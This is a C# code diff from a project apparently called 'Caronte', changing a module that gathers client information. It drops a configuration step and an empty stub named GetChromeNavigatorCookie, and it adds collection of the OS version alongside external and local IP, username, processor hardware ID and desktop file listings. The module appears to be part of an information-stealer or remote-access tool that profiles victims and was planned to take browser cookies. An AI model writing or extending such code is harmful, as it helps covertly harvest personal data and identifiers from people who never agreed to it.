@@ -16,18 +16,11 @@ using System.Management;
 
 namespace Caronte.Modules.Information.GetClientInformation
 {
-    public class GetClientInformationQueryHandler : HandleClientExceptions, IRequestHandler<GetClientInformationQuery, CommomResponse<ClientInformation>>, IConfigurable
+    public class GetClientInformationQueryHandler : HandleClientExceptions, IRequestHandler<GetClientInformationQuery, CommomResponse<ClientInformation>>
     {
-        private readonly InformationConfiguration informationConfiguration;
-
         public GetClientInformationQueryHandler(IHttpClientFactory httpClientFactory, IWebServiceURLFactory webServiceURLFactory) : base(httpClientFactory, webServiceURLFactory)
         {
-            informationConfiguration = new InformationConfiguration();
-        }
 
-        public void Configure()
-        {
-            var configuration = informationConfiguration.GetConfiguration();
         }
 
         public async Task<CommomResponse<ClientInformation>> Handle(GetClientInformationQuery request, CancellationToken cancellationToken)
@@ -39,7 +32,8 @@ namespace Caronte.Modules.Information.GetClientInformation
                 ExternalIp = await GetExternalIp(),
                 LocalIp = await GetLocalIp(),
                 Username = await GetUsername(),
-                ProcessorIdentifier = GetProcessorIdentifer()
+                ProcessorIdentifier = GetProcessorIdentifer(),
+                OSVersion = GetOSVersion()
             });
         }
 
@@ -114,20 +108,6 @@ namespace Caronte.Modules.Information.GetClientInformation
             return desktopFiles;
         }
 
-        private async Task<byte[]> GetChromeNavigatorCookie()
-        {
-            try
-            {
-
-            }
-            catch (Exception ex)
-            {
-                await Handle(ex);
-            }
-
-            return new byte[0];
-        }
-
         private string GetProcessorIdentifer()
         {
             var managementSearcher = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
@@ -139,6 +119,11 @@ namespace Caronte.Modules.Information.GetClientInformation
                 hwid = managementObject["ProcessorId"].ToString();
 
             return hwid;
+        }
+
+        private string GetOSVersion()
+        {
+            return System.Environment.OSVersion.VersionString;
         }
     }
 }
